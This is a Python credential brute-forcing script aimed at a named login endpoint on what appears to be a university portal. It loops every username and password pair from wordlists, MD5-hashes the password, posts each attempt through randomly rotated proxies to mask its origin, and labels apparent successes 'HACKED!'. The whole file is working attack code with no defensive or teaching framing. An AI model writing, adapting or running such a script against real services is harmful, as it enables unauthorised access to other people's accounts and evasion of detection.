# Sadaf-Brute-Forcing

import requests, hashlib, random

print("Sadaf Brute-Forcing Started Working !")

usernames_file = [every_line.strip('\n') for every_line in open('Usernames.txt', 'r')]
passwords_file = [every_line.strip('\n') for every_line in open('Passwords.txt', 'r')]
proxies_file = [every_line.strip('\n') for every_line in open('Proxies.txt', 'r')]


def convert_to_md5(password):
    return hashlib.md5(password.encode('UTF-8')).hexdigest()


def check_results(username, password):
    proxies = {
        "http": random.choice(proxies_file)
    }

    data = dict(UserPassword=convert_to_md5(password), pswdStatus='mediocre', UserID=username, DummyVar='')

    try:
        request = requests.post('http://puya.ubahar.ir/gateway/UserInterim.php', data=data, proxies=proxies, timeout=None)

        if request.status_code == 200:
            if request.headers['Server'] == 'Apache':
                print(username + ' - ' + password + ' - HACKED!')
            else:
                print(username + ' - ' + password + ' - 0')
        else:
            print('HTTP Code Error : ' + username + ' - ' + password)

    except:
        print('Connection Error : ' + username + ' - ' + password)

for checking_username in usernames_file:
    for checking_password in passwords_file:
        check_results(checking_username, checking_password)